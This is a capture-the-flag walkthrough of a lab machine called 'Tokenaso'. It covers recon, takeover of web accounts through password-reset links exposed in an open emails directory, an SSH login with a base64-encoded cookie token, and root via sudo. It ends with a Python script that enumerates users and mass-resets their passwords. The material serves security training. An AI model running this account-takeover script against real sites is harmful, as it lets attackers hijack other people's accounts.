![Screenshot](/hard/Tokenaso/Images/machine.png)

Difficulty: **hard**

Made by: **d1se0**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)
* 💣 [Extra (EXPLOIT)](#extra)

---


First of all we make sure the machine is up, we can do this with the command **ping**.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.190 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.131 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.134 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2049ms
rtt min/avg/max/mdev = 0.131/0.151/0.190/0.027 ms
```

Okay now, we can start our phase of **reconnaissance**.

---
# Reconnaissance

So we use first **nmap** to scan what ports are open in the target. 

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-20 18:54 -05
Initiating ARP Ping Scan at 18:54
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:54, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:54
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:54, 3.00s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000028s latency).
Scanned at 2025-12-20 18:54:02 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.38 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

So when the scan concludes we can see that are 2 ports open:

- port 22 (ssh / secure shell)
- port 80 (http / Hyper-Text Transfer Protocol)

But, we need to know more about these ports, so we can use once again **nmap**.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target
```

**-p22,80** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/hard/Tokenaso/Images/image1.png)

It's clearly more pretty and readable to the sight.

And we can see that the port 80 is a website, let's take a look what technologies uses, we can do this **whatweb**.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ whatweb http://172.17.0.2 
http://172.17.0.2 [200 OK] Apache[2.4.58], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[SecureAuth Pro - Portal de Acceso]
```

It seems that uses **PHP** because the cookie, but let's take a further look with our browser.

![Screenshot](/hard/Tokenaso/Images/image2.png)

It seems a login page, we got the credentials of the user **diseo** at first sight but i'm going to enumerate more deeply the resources of the website with **gobuster**.

---
# Enumeration

We can try to enumerate the website with **gobuster** and also try to find possible files, in this case i'm going add the extension of **php**.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2696]
/login.php            (Status: 200) [Size: 3020]
/admin.php            (Status: 302) [Size: 0] [--> login.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/emails               (Status: 301) [Size: 309] [--> http://172.17.0.2/emails/]
/emails.php           (Status: 302) [Size: 0] [--> login.php]
/forgot-password.php  (Status: 200) [Size: 1035]
/server-status        (Status: 403) [Size: 275]
Progress: 441116 / 441116 (100.00%)
```

We see a lot of results here, the interesting ones are:

- **admin.php**
- **emails**/ it have something here.
- **dashboard.php**
- **config.php**

So I started with the config file, but after a long enumeration doesn't have anything interesting in there.

**dashboard** and **admin** redirect us to the login page.

So then let's take a look to **emails** with out browser...

![Screenshot](/hard/Tokenaso/Images/image3.png)

Interesting, directory listening here...

So i'm going to click that I forgot the password of the user **diseo**, and let's see what happens.

![Screenshot](/hard/Tokenaso/Images/image4.png)

But first I try with a random user like **test** sometimes doing the incorrect action can show us something interesting.

![Screenshot](/hard/Tokenaso/Images/image5.png)

This is a vulnerability, basically show us that the user doesn't exist, we can try to make a python script to enumerate users inside of the system with this error message, but, let's try first to enter a existent user like **diseo**.

![Screenshot](/hard/Tokenaso/Images/image6.png)

Okay it seems that sends a mail to **diseo**, but if we remember before that we got a interesting directory, **emails**.

So let's take a look once again to the directory **emails** if anything changed.

![Screenshot](/hard/Tokenaso/Images/image7.png)

Oh! it seems that we can see the emails of the user **diseo** let's take a look.

![Screenshot](/hard/Tokenaso/Images/image8.png)

And we got this, it seems the same mail that we forgot our password.

And even the link to reset the password of **diseo**, this is bad!

![Screenshot](/hard/Tokenaso/Images/image9.png)

And holy, we can change the password of the user, so i'm going to change it as my preference.

![Screenshot](/hard/Tokenaso/Images/image10.png)

It seems we change it so i'm going to login with this new password.

![Screenshot](/hard/Tokenaso/Images/image11.png)

And we are in! so we can try to even enumerate users and steal this reset url and change his password, but is not necessary because if we remember, exists a user **victim** and it's part of the department of administration.

So we can try to login as this user and pretend that we forgot the password and steal the reset url to change his password.

---
# Exploitation

And doing all the steps that we replicate before but just changing the user to **victim** we successfully get the access of this user.

![Screenshot](/hard/Tokenaso/Images/image12.png)

And let's see if we got access of the account **victim**.

![Screenshot](/hard/Tokenaso/Images/image13.png)

And we are in like a admin!

So we get access of the admin panel, so let's take a look in there.

![Screenshot](/hard/Tokenaso/Images/image14.png)

And we can see a lot of interesting things!

But... nothing works, it seems pure decoration, literally I take a deeper look into it source code and more over and over again.

After enumerating a loooooot literally everything, it gives me the idea to intercept the traffic of the requests with **burpsuite**.

And we can receive this:

```ruby
Host: 172.17.0.2
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Referer: http://172.17.0.2/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16; PHPSESSID=hbk76vuhr36b2e4ltbd0is05ku; admin_token=UEBzc3cwcmQhVXNlcjRkbTFuMjAyNSEjLQ%3D%3D
Connection: keep-alive
```


And we see something interesting here, we can see that the admin token it's very weird, the format is in format **base64** and **url encoded**.

So let's first decode the url format.

the characters or values ```$3D``` is equal to ```=```

So with doing this we got this:

- ``UEBzc3cwcmQhVXNlcjRkbTFuMjAyNSEjLQ==```

And decoding this in base64 we got this:

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ echo "UEBzc3cwcmQhVXNlcjRkbTFuMjAyNSEjLQ==" | base64 -d
P@ssw0rd!User4dm1n2025!#-
```

We got a credential, it seems a password of a user **admin**, we can try to login with ssh, and let's see what happens...

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/enumeration]
└─$ ssh admin@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:x5hgBIKbC2bhYOGMYq7UH8HjH5cNtezj8Im+80TMT4Y
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
admin@172.17.0.2's password: 
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.17.10+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Dec  6 10:55:04 2025 from 172.17.0.1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@c924f10ab199:~$
```

And we are in!

---
# Privilege Escalation

If we execute **sudo -l** we have a privilege of **SUDOER**

```
admin@c924f10ab199:~$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on c924f10ab199:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin may run the following commands on c924f10ab199:
    (ALL) ALL
```

We can see that **any** user even the user **root** can execute **any** command, so we can receive a shell as the user root just doing **sudo bash**

```
admin@c924f10ab199:~$ sudo bash
root@c924f10ab199:/home/admin# whoami
root
```

We are root now ***...pwned..!***

---
# Extra

I did an exploit that abuses these vulnerabilities with **python**.

1. First of all we notice that we can **enumerate** users in the page of **forgot-password**.
2. Also the website doesn't refresh or change the **csrf** token when trying to change the password.
3. We got any email of any user in the part of  the **/emails/** directory and doesn't change anything.
4. We have access of the reset url, without any authentication.
5. And when changing the password doesn't require any validation.

So with all of this I make a script of python that exploit this, enumerating users and when the user exists it obtain the json of the emails and extracts the reset url and automatically we change the password that we want.

So here it's the exploit:

```python
from pwn import *
import requests
import signal
import sys
import json

target = "http://172.17.0.2/forgot-password.php"
dictionary = "test_users"

def stop(sig, frame):
        log.warn("QUITTING")
        sys.exit(0)

signal.signal(signal.SIGINT, stop)

def check_user(user, cookie, token, password):
        payload = {
                "csrf": token,
                "username": user
        }

        ck = {"PHPSESSID": cookie}

        response = requests.post(url=target, cookies=ck, data=payload)

        if "Usuario no encontrado" in response.text: return

        print("------------------------------------------------")
        log.info(f'User "{user}" exists, trying to change his password...')
        emails = f"http://172.17.0.2/emails/{user}_emails.json"

        get_emails = requests.get(url=emails)

        format = json.loads(get_emails.text)
        reset = format[0]["reset_url"]

        new_pass = {
                "new_password": password,
                "confirm_password": password
        }

        change = requests.post(url=reset, cookies=ck, data=new_pass)

        if "correctamente" in change.text:
                log.warn(f'PWNED! his new password is: {password}')


def execute():
        cookie = input("[*] Enter your cookie --> ").strip()
        token = input("[*] Enter your csrf token --> ").strip()
        password = input("\n[!] Enter the password you want to change --> ").strip()
        print()

        bar = log.progress("Enumerating users...")

        with open(dictionary) as file:
                for line in file:

                        if "#" in line or not line: continue
                        convert = str(line).strip()

                        bar.status(f"Trying with the user {convert}")
                        check_user(convert, cookie, token, password)

                bar.success("Finished.")

if __name__ == "__main__":
        execute()
```

So let's see if it works.

**Note**: I change a little bit the database to add more users and test if it really works. (**OPTIONAL**)

If you want to add more users in the database you just need to change the next file:

- /var/www/html/reset-db.php

and any users as you want, in my case I added these:

```php
$users = [
    ['username' => 'diseo', 'password' => password_hash('hacker', PASSWORD_DEFAULT), 'email' => 'diseo@ctf.com', 'name' => 'Diseo User', 'role' => 'user'],
    ['username' => 'victim', 'password' => password_hash('SuperPassword#-', PASSWORD_DEFAULT), 'email' => 'victim@ctf.com', 'name' => 'Victim User', 'role' => 'admin'],
    ['username' => 'craft', 'password' => password_hash('AU()943Mnd$!', PASSWORD_DEFAULT), 'email' => 'craft@ctf.com', 'name' => 'Craft User', 'role' => 'admin'],
    ['username' => 'administrator', 'password' => password_hash('NN048IWs4#$', PASSWORD_DEFAULT), 'email' => 'administrator@ctf.com', 'name' => 'Administrator User', 'role' => 'admin'],
    ['username' => 'mario', 'password' => password_hash('Pinguinazo!##8s', PASSWORD_DEFAULT), 'email' => 'mario@ctf.com', 'name' => 'Mario User', 'role' => 'admin']
    ];
```

And to apply the changes you can save it and then visit the website:

- ```http://172.17.0.2/reset-db.php```

we can do this with curl.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/exploits]
└─$ curl -s http://172.17.0.2/reset-db.php | html2text
â Base de datos reseteada correctamente Usuarios creados: - diseo
(contraseÃ±a: hacker) - Rol: Usuario - victim (contraseÃ±a: SuperPassword#-) -
Rol: Administrado
```

And when doing this, we can use our exploit.

## Requirements:

- You need to install pwntools, you can do it with pip3, pipx, apt, etc...

And then the script needs your cookie, you can grab it with developer tools, or intercepting the request.

Also the script need the **CSRF** token, you can grab them with **burpsuite** intercepting the request when sending the "email" from the part of forgetting the password.

So let's test if it really works. In this repository contains a list of users to try, aprox 300 users (contains the user **diseo** and **victim**).

Let's execute our exploit then.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/tokenaso/exploits]
└─$ python3 exploit.py 
[*] Enter your cookie --> hbk76vuhr36b2e4ltbd0is05ku
[*] Enter your csrf token --> 680c0e9e47cbe3a8dcd757ae1bfaa5844798854b2cd5ad5330845a26e7dca021

[!] Enter the password you want to change --> pwned123

[+] Enumerating users...: Finished.
------------------------------------------------
[*] User "craft" exists, trying to change his password...
[!] PWNED! his new password is: pwned123
------------------------------------------------
[*] User "victim" exists, trying to change his password...
[!] PWNED! his new password is: pwned123
------------------------------------------------
[*] User "mario" exists, trying to change his password...
[!] PWNED! his new password is: pwned123
------------------------------------------------
[*] User "administrator" exists, trying to change his password...
[!] PWNED! his new password is: pwned123
------------------------------------------------
[*] User "diseo" exists, trying to change his password...
[!] PWNED! his new password is: pwned123
```

It seems that works, :)))

byeeeee
